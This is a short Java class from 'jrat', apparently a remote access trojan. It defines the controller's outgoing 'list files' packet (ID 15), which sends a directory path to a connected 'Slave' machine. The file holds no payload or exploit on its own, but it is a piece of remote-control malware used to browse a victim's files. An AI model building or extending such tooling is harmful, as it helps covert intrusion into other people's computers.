package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet15ListFiles extends AbstractOutgoingPacket {

	private String path;

	public Packet15ListFiles(String path) {
		this.path = path;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
	}

	@Override
	public short getPacketId() {
		return 15;
	}

}
